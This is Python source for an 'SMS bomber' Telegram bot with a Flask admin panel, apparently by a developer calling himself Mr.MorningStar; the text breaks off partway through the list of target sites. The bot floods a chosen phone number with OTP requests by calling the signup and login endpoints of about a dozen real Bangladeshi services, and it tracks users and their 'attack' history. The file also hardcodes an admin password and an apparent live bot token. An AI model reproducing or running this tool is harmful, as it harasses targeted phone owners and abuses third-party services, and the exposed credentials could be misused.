#!/usr/bin/env python3
import requests
import time
import os
import sys
import json
import threading
import atexit
import signal
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Suppress warnings
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== FLASK ADMIN DASHBOARD ====================
from flask import Flask, jsonify, request, render_template_string, redirect, url_for
import hashlib

app = Flask(__name__)

# Admin configuration
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "A3braham77"
MAINTENANCE_MESSAGE = "🔧 Server is under maintenance - EMON JOY"

# Database files
BANNED_USERS_FILE = "banned_users.json"
USER_HISTORY_FILE = "user_history.json"
USER_LIMITS_FILE = "user_limits.json"

# Global variables (shared with bot)
active_attacks = {}
bot_users = {}
bot_stats = {
    'total_users': 0,
    'total_attacks': 0,
    'total_messages': 0,
    'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    'server_status': 'ONLINE'
}

banned_users = []
user_limits = {}
user_history = {}
admin_sessions = {}

def load_json_file(filename, default):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
    except:
        pass
    return default

def save_json_file(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"Error saving {filename}: {e}")

# Load data
banned_users = load_json_file(BANNED_USERS_FILE, [])
user_limits = load_json_file(USER_LIMITS_FILE, {})
user_history = load_json_file(USER_HISTORY_FILE, {})

def is_banned(user_id):
    return str(user_id) in banned_users

def get_user_limit(user_id):
    return user_limits.get(str(user_id), {'daily': 3, 'total': 100})

def update_user_history(user_id, target_number):
    uid = str(user_id)
    if uid not in user_history:
        user_history[uid] = []
    
    user_history[uid].append({
        'target': target_number,
        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'success': 0,
        'failed': 0
    })
    
    if len(user_history[uid]) > 50:
        user_history[uid] = user_history[uid][-50:]
    
    save_json_file(USER_HISTORY_FILE, user_history)

# HTML Templates (condensed but complete)
LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Admin Login</title>
<style>body{font-family:Arial;background:#f0f0f0}.login-box{max-width:400px;margin:100px auto;background:white;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.1)}.login-box h2{text-align:center;color:#333}.login-box input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px}.login-box button{width:100%;padding:10px;background:#667eea;color:white;border:none;border-radius:5px;cursor:pointer}.error{color:red;text-align:center}</style></head>
<body><div class="login-box"><h2>Admin Login</h2>
<form method="POST" action="/login"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Login</button></form></div></body></html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head><title>Admin Dashboard</title>
<style>
body{font-family:Arial;margin:20px;background:#f0f0f0}.container{max-width:1400px;margin:auto;background:white;padding:20px;border-radius:10px}
.header{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:20px;border-radius:5px}
.nav{background:#333;padding:10px;border-radius:5px;margin:20px 0}.nav a{color:white;padding:10px 20px;text-decoration:none;display:inline-block}.nav a:hover{background:#555}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:20px 0}
.stat-card{background:white;padding:20px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center}
.stat-card h3{margin:0;color:#666;font-size:14px}.stat-card .number{font-size:32px;font-weight:bold;color:#667eea}
.server-status{padding:10px;border-radius:5px;font-weight:bold}
.status-online{background:#d4edda;color:#155724}.status-offline{background:#f8d7da;color:#721c24}
.user-table{width:100%;border-collapse:collapse;margin-top:20px}
.user-table th{background:#667eea;color:white;padding:10px}
.user-table td{padding:10px;border-bottom:1px solid #ddd}
.user-table tr:hover{background:#f5f5f5}
.btn{padding:5px 10px;border:none;border-radius:3px;cursor:pointer;margin:2px}
.btn-success{background:#28a745;color:white}.btn-danger{background:#dc3545;color:white}
.btn-warning{background:#ffc107}.btn-info{background:#17a2b8;color:white}
.broadcast-box{background:#e9ecef;padding:20px;border-radius:5px;margin:20px 0}
input,textarea,select{width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:5px}
.history-box{max-height:400px;overflow-y:auto;border:1px solid #ddd;padding:10px}
.badge{padding:3px 8px;border-radius:3px;font-size:12px}
.badge-danger{background:#dc3545;color:white}.badge-success{background:#28a745;color:white}
.tab{overflow:hidden;border:1px solid #ccc;background-color:#f1f1f1}
.tab button{background-color:inherit;float:left;border:none;outline:none;cursor:pointer;padding:14px 16px;transition:0.3s}
.tab button:hover{background-color:#ddd}.tab button.active{background-color:#667eea;color:white}
.tabcontent{display:none;padding:20px;border:1px solid #ccc;border-top:none}
</style></head>
<body><div class="container">
<div class="header"><h1>🔥 SMS BOMBER ADMIN PANEL</h1><p>Developed by EMON JOY (Mr.MorningStar)</p>
<div class="server-status %s" id="serverStatus">Server Status: <strong>%s</strong></div></div>
<div class="nav"><a href="#" onclick="openTab(event,'Dashboard')">Dashboard</a><a href="#" onclick="openTab(event,'Users')">Users</a><a href="#" onclick="openTab(event,'History')">History</a><a href="#" onclick="openTab(event,'Broadcast')">Broadcast</a><a href="#" onclick="openTab(event,'Controls')">Controls</a><a href="/logout">Logout</a></div>
<div id="Dashboard" class="tabcontent"><div class="stats-grid"><div class="stat-card"><h3>Total Users</h3><div class="number" id="totalUsers">0</div></div><div class="stat-card"><h3>Total Attacks</h3><div class="number" id="totalAttacks">0</div></div><div class="stat-card"><h3>Active Now</h3><div class="number" id="activeNow">0</div></div><div class="stat-card"><h3>Banned Users</h3><div class="number" id="bannedUsers">0</div></div></div><div id="statsDetails">Loading...</div></div>
<div id="Users" class="tabcontent"><h3>User Management</h3><input type="text" id="userSearch" placeholder="Search users..." onkeyup="searchUsers()"><div id="usersList">Loading...</div></div>
<div id="History" class="tabcontent"><h3>Attack History</h3><div id="historyList">Loading...</div></div>
<div id="Broadcast" class="tabcontent"><h3>Send Broadcast</h3><textarea id="broadcastMsg" rows="4" placeholder="Type your message here..."></textarea><button class="btn btn-success" onclick="sendBroadcast()">Send to All Users</button><div id="broadcastResult"></div></div>
<div id="Controls" class="tabcontent"><h3>Server Controls</h3><button class="btn btn-success" onclick="serverOn()">Turn ON</button><button class="btn btn-danger" onclick="serverOff()">Turn OFF</button><button class="btn btn-warning" onclick="forceStopAll()">Force Stop All</button><button class="btn btn-info" onclick="restartServer()">Restart Server</button><div id="controlResult"></div></div></div>
<script>
function openTab(evt,tabName){var i,tabcontent=document.getElementsByClassName("tabcontent"),tablinks=document.getElementsByClassName("tablinks");for(i=0;i<tabcontent.length;i++)tabcontent[i].style.display="none";for(i=0;i<tablinks.length;i++)tablinks[i].className=tablinks[i].className.replace(" active","");document.getElementById(tabName).style.display="block";evt.currentTarget.className+=" active";if(tabName=='Dashboard')loadDashboard();if(tabName=='Users')loadUsers();if(tabName=='History')loadHistory();}
function loadDashboard(){fetch('/api/stats').then(r=>r.json()).then(data=>{document.getElementById('totalUsers').innerText=data.total_users;document.getElementById('totalAttacks').innerText=data.total_attacks;document.getElementById('activeNow').innerText=data.active_attacks;document.getElementById('bannedUsers').innerText=data.banned_users;let html='<table class="user-table"><tr><th>Metric</th><th>Value</th></tr><tr><td>Server Status</td><td>'+data.server_status+'</td></tr><tr><td>Uptime</td><td>'+data.uptime+'</td></tr><tr><td>Start Time</td><td>'+data.start_time+'</td></tr></table>';document.getElementById('statsDetails').innerHTML=html;});}
function loadUsers(){fetch('/api/users').then(r=>r.json()).then(users=>{let html='<table class="user-table"><tr><th>ID</th><th>Username</th><th>Name</th><th>Attacks</th><th>Status</th><th>Actions</th></tr>';users.forEach(user=>{html+='<tr><td>'+user.id+'</td><td>@'+(user.username||'None')+'</td><td>'+user.name+'</td><td>'+user.attacks+'</td><td>'+(user.banned?'<span class="badge badge-danger">Banned</span>':'<span class="badge badge-success">Active</span>')+'</td><td><button class="btn btn-info" onclick="viewHistory('+user.id+')">History</button>'+(user.banned?'<button class="btn btn-success" onclick="unbanUser('+user.id+')">Unban</button>':'<button class="btn btn-danger" onclick="banUser('+user.id+')">Ban</button>')+'<button class="btn btn-warning" onclick="setLimit('+user.id+')">Set Limit</button></td></tr>';});html+='</table>';document.getElementById('usersList').innerHTML=html;});}
function loadHistory(){fetch('/api/history').then(r=>r.json()).then(history=>{let html='<div class="history-box">';history.forEach(item=>{html+='<div style="border-bottom:1px solid #ddd;padding:10px;"><strong>User:</strong> '+item.user+'<br><strong>Target:</strong> '+item.target+'<br><strong>Time:</strong> '+item.time+'</div>';});html+='</div>';document.getElementById('historyList').innerHTML=html;});}
function searchUsers(){let input=document.getElementById('userSearch').value.toUpperCase(),table=document.querySelector('.user-table');if(!table)return;let tr=table.getElementsByTagName('tr');for(let i=1;i<tr.length;i++){let match=false,td=tr[i].getElementsByTagName('td');for(let j=0;j<td.length;j++){if(td[j]&&td[j].innerHTML.toUpperCase().indexOf(input)>-1){match=true;break;}}tr[i].style.display=match?'':'none';}}
function banUser(userId){fetch('/api/ban',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(()=>loadUsers());}
function unbanUser(userId){fetch('/api/unban',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(()=>loadUsers());}
function setLimit(userId){let limit=prompt("Enter daily attack limit (1-100):","3");if(limit){fetch('/api/set_limit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId,limit:parseInt(limit)})}).then(()=>loadUsers());}}
function viewHistory(userId){fetch('/api/user_history/'+userId).then(r=>r.json()).then(history=>{let html='<div class="history-box"><h4>User History</h4>';history.forEach(item=>{html+='<div>'+item.time+' - '+item.target+'</div>';});html+='</div>';let win=window.open("","History","width=600,height=400");win.document.body.innerHTML=html;});}
function sendBroadcast(){let msg=document.getElementById('broadcastMsg').value;if(!msg)return alert('Enter message');fetch('/api/broadcast',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:msg})}).then(r=>r.json()).then(data=>{document.getElementById('broadcastResult').innerHTML='<p style="color:green;">✓ Sent to '+data.count+' users</p>';});}
function serverOn(){fetch('/api/server_on',{method:'POST'}).then(()=>{alert('Server turned ON');location.reload();});}
function serverOff(){fetch('/api/server_off',{method:'POST'}).then(()=>{alert('Server turned OFF - Maintenance mode');location.reload();});}
function forceStopAll(){if(confirm('Stop all attacks?')){fetch('/api/force_stop_all',{method:'POST'}).then(()=>{alert('All attacks stopped');loadDashboard();});}}
function restartServer(){if(confirm('Restart server?')){fetch('/api/restart',{method:'POST'});}}
document.querySelector('.tablinks').click();setInterval(loadDashboard,5000);
</script></body></html>
'''

# Flask routes
@app.route('/')
def index():
    session_id = request.cookies.get('session_id')
    if session_id and session_id in admin_sessions:
        status_class = 'status-online' if bot_stats['server_status'] == 'ONLINE' else 'status-offline'
        return render_template_string(DASHBOARD_HTML % (status_class, bot_stats['server_status']))
    return render_template_string(LOGIN_HTML)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
        session_id = hashlib.md5(f"{username}{datetime.now()}".encode()).hexdigest()
        admin_sessions[session_id] = datetime.now()
        response = app.make_response(redirect(url_for('index')))
        response.set_cookie('session_id', session_id)
        return response
    return render_template_string(LOGIN_HTML.replace('</form>', '<p class="error">Invalid credentials</p></form>'))

@app.route('/logout')
def logout():
    session_id = request.cookies.get('session_id')
    if session_id in admin_sessions:
        del admin_sessions[session_id]
    return redirect(url_for('index'))

@app.route('/api/stats')
def api_stats():
    uptime = datetime.now() - datetime.strptime(bot_stats['start_time'], "%Y-%m-%d %H:%M:%S")
    hours = uptime.total_seconds() // 3600
    minutes = (uptime.total_seconds() % 3600) // 60
    return jsonify({
        'total_users': bot_stats['total_users'],
        'total_attacks': bot_stats['total_attacks'],
        'active_attacks': len(active_attacks),
        'banned_users': len(banned_users),
        'server_status': bot_stats['server_status'],
        'uptime': f"{int(hours)}h {int(minutes)}m",
        'start_time': bot_stats['start_time']
    })

@app.route('/api/users')
def api_users():
    user_list = []
    for uid, data in list(bot_users.items())[:100]:
        user_list.append({
            'id': uid,
            'username': data.get('username', ''),
            'name': data.get('first_name', 'Unknown'),
            'attacks': data.get('total_attacks', 0),
            'banned': str(uid) in banned_users
        })
    return jsonify(user_list)

@app.route('/api/history')
def api_history():
    history_list = []
    for uid, records in list(user_history.items())[:50]:
        for record in records[-5:]:
            history_list.append({
                'user': uid,
                'target': record.get('target', 'Unknown'),
                'time': record.get('time', 'Unknown')
            })
    return jsonify(history_list)

@app.route('/api/user_history/<user_id>')
def api_user_history(user_id):
    return jsonify(user_history.get(user_id, [])[-20:])

@app.route('/api/ban', methods=['POST'])
def api_ban():
    data = request.json
    user_id = str(data.get('user_id'))
    if user_id not in banned_users:
        banned_users.append(user_id)
        save_json_file(BANNED_USERS_FILE, banned_users)
        if int(user_id) in active_attacks:
            active_attacks[int(user_id)]['stop'] = True
    return jsonify({'success': True})

@app.route('/api/unban', methods=['POST'])
def api_unban():
    data = request.json
    user_id = str(data.get('user_id'))
    if user_id in banned_users:
        banned_users.remove(user_id)
        save_json_file(BANNED_USERS_FILE, banned_users)
    return jsonify({'success': True})

@app.route('/api/set_limit', methods=['POST'])
def api_set_limit():
    data = request.json
    user_id = str(data.get('user_id'))
    limit = data.get('limit', 3)
    user_limits[user_id] = {'daily': limit, 'total': 999}
    save_json_file(USER_LIMITS_FILE, user_limits)
    return jsonify({'success': True})

@app.route('/api/broadcast', methods=['POST'])
def api_broadcast():
    data = request.json
    message = data.get('message', '')
    def broadcast_worker():
        count = 0
        for uid in bot_users:
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': int(uid),
                    'text': f"📢 **ADMIN BROADCAST**\n\n{message}",
                    'parse_mode': 'Markdown'
                })
                count += 1
                time.sleep(0.05)
            except:
                pass
        log_activity(f"Admin broadcast sent to {count} users")
    threading.Thread(target=broadcast_worker, daemon=True).start()
    return jsonify({'success': True, 'count': len(bot_users)})

@app.route('/api/force_stop_all', methods=['POST'])
def api_force_stop_all():
    for aid in list(active_attacks.keys()):
        active_attacks[aid]['stop'] = True
    log_activity("Admin force stopped all attacks")
    return jsonify({'success': True})

@app.route('/api/server_on', methods=['POST'])
def api_server_on():
    bot_stats['server_status'] = 'ONLINE'
    log_activity("Admin turned server ON")
    return jsonify({'success': True})

@app.route('/api/server_off', methods=['POST'])
def api_server_off():
    bot_stats['server_status'] = 'OFFLINE'
    for aid in list(active_attacks.keys()):
        active_attacks[aid]['stop'] = True
    log_activity("Admin turned server OFF (maintenance mode)")
    return jsonify({'success': True})

@app.route('/api/restart', methods=['POST'])
def api_restart():
    threading.Thread(target=lambda: os.execl(sys.executable, sys.executable, *sys.argv), daemon=True).start()
    return jsonify({'success': True})

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

print("✅ Flask Admin Dashboard started")
print("🔐 Login: admin / A3braham77")
print("="*60)

# ==================== BOT CONFIGURATION ====================
BOT_TOKEN = "8781609298:AAG6GxsYKPdFZkkyFYxaDhOBFeHO7PcnRls"
USERS_FILE = "bot_users.json"
STATS_FILE = "bot_stats.json"
LOG_FILE = "bot_activity.log"

server_is_shutting_down = False
shutdown_initiated = False

def load_data():
    global bot_users, bot_stats
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                bot_users = json.load(f)
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                bot_stats = json.load(f)
    except Exception as e:
        log_activity(f"Error loading data: {e}")

def save_data():
    try:
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(bot_users, f, indent=2, ensure_ascii=False)
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(bot_stats, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log_activity(f"Error saving data: {e}")

def log_activity(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clean_message = message.encode('ascii', 'ignore').decode('ascii')
    print(f"[{timestamp}] {clean_message}")
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {clean_message}\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("="*60)
    print("          🔥 SMS BOMBER SERVER 🔥")
    print("          Developed by Mr.MorningStar")
    print("="*60)
    print(f"  Server Status: {bot_stats['server_status']}")
    print(f"  Start Time: {bot_stats['start_time']}")
    print("="*60)

def notify_all_users(message):
    count = 0
    for uid in bot_users:
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                'chat_id': int(uid),
                'text': message,
                'parse_mode': 'Markdown'
            })
            count += 1
            time.sleep(0.05)
        except:
            pass
    log_activity(f"Broadcast sent to {count} users")

def terminal_commands():
    while not server_is_shutting_down:
        try:
            cmd = input().strip()
            if cmd.startswith("broadcast "):
                notify_all_users(cmd[10:])
            elif cmd == "stats":
                print(f"📊 Users: {bot_stats['total_users']}, Attacks: {bot_stats['total_attacks']}, Active: {len(active_attacks)}")
            elif cmd == "stopall":
                for aid in list(active_attacks.keys()):
                    active_attacks[aid]['stop'] = True
                print("✅ All attacks stopped")
            elif cmd == "exit":
                server_shutdown()
                os._exit(0)
        except:
            pass

def server_shutdown():
    global server_is_shutting_down, shutdown_initiated
    if server_is_shutting_down or shutdown_initiated:
        return
    shutdown_initiated = True
    server_is_shutting_down = True
    if bot_stats['server_status'] == 'ONLINE':
        bot_stats['server_status'] = 'OFFLINE'
        save_data()
        for uid in list(active_attacks.keys()):
            active_attacks[uid]['stop'] = True
        if bot_users:
            notify_all_users("🔴 **SERVER SHUTDOWN**\n\nServer going offline.")
        log_activity("Server shutting down")

def signal_handler(sig, frame):
    server_shutdown()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(lambda: server_shutdown() if not shutdown_initiated else None)

def format_phone_number(number):
    if not number.startswith("+88"):
        if number.startswith("88"):
            full_number = "+" + number
        else:
            full_number = "+88" + number
    else:
        full_number = number
    return full_number, full_number.replace("+88", "")

def track_user(user_id, username, first_name):
    uid = str(user_id)
    if uid not in bot_users:
        bot_users[uid] = {
            'username': username,
            'first_name': first_name,
            'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'total_attacks': 0,
            'total_messages': 0
        }
        bot_stats['total_users'] = len(bot_users)
        log_activity(f"New user: {username or first_name}")
        save_data()
    else:
        bot_users[uid]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        bot_users[uid]['total_messages'] += 1
        save_data()

# ==================== 32 SITES (COMPLETE) ====================
def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, username):
    if str(user_id) in banned_users:
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                'chat_id': chat_id,
                'text': "⛔ **You are banned!**"
            })
        except:
            pass
        return
    
    if bot_stats['server_status'] == 'OFFLINE':
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                'chat_id': chat_id,
                'text': MAINTENANCE_MESSAGE,
                'parse_mode': 'Markdown'
            })
        except:
            pass
        return
    
    session = requests.Session()
    cycle_num = 0
    success = 0
    failed = 0
    MAX_CYCLES = 3
    
    uid = str(user_id)
    if uid in bot_users:
        bot_users[uid]['total_attacks'] += 1
        bot_stats['total_attacks'] += 1
        save_data()
    
    update_user_history(user_id, full_number)
    log_activity(f"Attack started by {username} on {full_number}")
    
    try:
        while user_id in active_attacks and not active_attacks[user_id].get('stop', False) and not server_is_shutting_down and cycle_num < MAX_CYCLES:
            cycle_num += 1
            cycle_success = 0
            cycle_failed = 0
            
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': f"🔄 **CYCLE {cycle_num}/{MAX_CYCLES} STARTED**",
                    'parse_mode': 'Markdown',
                    'reply_markup': json.dumps({'inline_keyboard': [[{'text': '🛑 STOP', 'callback_data': f'stop_{user_id}'}]]})
                })
            except:
                pass
            
            # 1. Shwapno
            try:
                url = "https://www.shwapno.com/api/auth"
                headers = {'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.shwapno.com', 'referer': 'https://www.shwapno.com/', 'user-agent': 'Mozilla/5.0'}
                res = session.post(url, json={"phoneNumber": full_number}, headers=headers, timeout=5)
                status = f"[Shwapno] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Shwapno] ✗ Failed"})
            
            # 2. RedX
            try:
                url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
                res = session.post(url, json={"phoneNumber": clean_number}, timeout=5)
                status = f"[RedX] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[RedX] ✗ Failed"})
            
            # 3. Bikroy
            try:
                url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={clean_number}"
                res = session.get(url, headers={"application-name": "web"}, timeout=5)
                status = f"[Bikroy] {'✓' if res.status_code==200 else '?'} {res.status_code}"
                if res.status_code == 200:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Bikroy] ✗ Failed"})
            
            # 4. GPFI
            try:
                url = "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp"
                headers = {'Content-Type': 'application/json', 'Origin': 'https://gpfi.grameenphone.com', 'Referer': 'https://gpfi.grameenphone.com/', 'User-Agent': 'Mozilla/5.0'}
                res = session.post(url, json={"phone": raw_number, "email": "", "language": "en"}, headers=headers, timeout=5)
                status = f"[GPFI] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[GPFI] ✗ Failed"})
            
            # 5. Paperfly
            try:
                url = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php'
                data = {"full_name": "Morning Star", "company_name": "abcd", "email_address": "ms@gmail.com", "phone_number": raw_number}
                res = session.post(url, json=data, timeout=5)
                status = f"[Paperfly] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Paperfly] ✗ Failed"})
            
            # 6. Hishabee
            try:
                headers_h = {"accept": "application/json, text/plain, */*", "platform": "WEB", "user-agent": "Mozilla/5.0", "origin": "https://web.hishabee.business", "referer": "https://web.hishabee.business/"}
                check_url = f"https://app.hishabee.business/api/V2/number_check?mobile_number={clean_number}&country_code=88"
                session.post(check_url, headers=headers_h, timeout=5)
                time.sleep(0.5)
                otp_url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={clean_number}&country_code=88"
                res = session.post(otp_url, headers=headers_h, timeout=5)
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                    try:
                        msg = res.json().get('message', 'OTP Sent')
                        status = f"[Hishabee] ✓ {msg}"
                    except:
                        status = f"[Hishabee] ✓ {res.status_code}"
                else:
                    cycle_failed += 1; failed += 1
                    status = f"[Hishabee] ? {res.status_code}"
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Hishabee] ✗ Failed"})
            
            # 7. Osudpotro
            try:
                url = 'https://api.osudpotro.com/api/v1/users/send_otp'
                headers = {'content-type': 'application/json', 'origin': 'https://osudpotro.com', 'referer': 'https://osudpotro.com/', 'user-agent': 'Mozilla/5.0'}
                data = {"mobile":"+88-"+raw_number, "deviceToken": "web", "language":"en", "os":"web"}
                res = session.post(url, headers=headers, json=data, timeout=5)
                status = f"[Osudpotro] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Osudpotro] ✗ Failed"})
            
            # 8. Sikho
            try:
                url = 'https://api.shikho.com/auth/v2/send/sms'
                headers = {'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'origin': 'https://shikho.com', 'referer': 'https://shikho.com/', 'user-agent': 'Mozilla/5.0'}
                data = {"phone":"88"+raw_number, "type":"student", "auth_type":"signup", "vendor":"shikho"}
                res = session.post(url, headers=headers, json=data, timeout=5)
                status = f"[Sikho] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Sikho] ✗ Failed"})
            
            # 9. Kirei
            try:
                url = 'https://frontendapi.kireibd.com/api/v2/send-login-otp'
                headers = {"accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://kireibd.com", "referer": "https://kireibd.com/", "user-agent": "Mozilla/5.0", "x-requested-with": "XMLHttpRequest"}
                data = {"email": raw_number}
                res = session.post(url, headers=headers, json=data, timeout=5)
                status = f"[Kirei] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Kirei] ✗ Failed"})
            
            # 10. Iqra Live
            try:
                url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{clean_number}"
                headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
                res = session.get(url, headers=headers, timeout=5)
                status = f"[Iqra Live] {'✓' if res.status_code==200 else '?'} {res.status_code}"
                if res.status_code == 200:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
                cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': "[Iqra Live] ✗ Failed"})
            
            # 11. Swap
            try:
                url = "https://api.swap.com.bd/api/v1/send-otp/v2"
                headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
                data = {"phone": clean_number}
                res = session.post(url, json=data, headers=headers, timeout=5)
                status = f"[Swap] {'✓' if res.status_code in [200,201,202] else '?'} {res.status_code}"
                if res.status_code in [200,201,202]:
                    cycle_success += 1; success += 1
                else:
                    cycle_failed += 1; failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': chat_id, 'text': status})
            except:
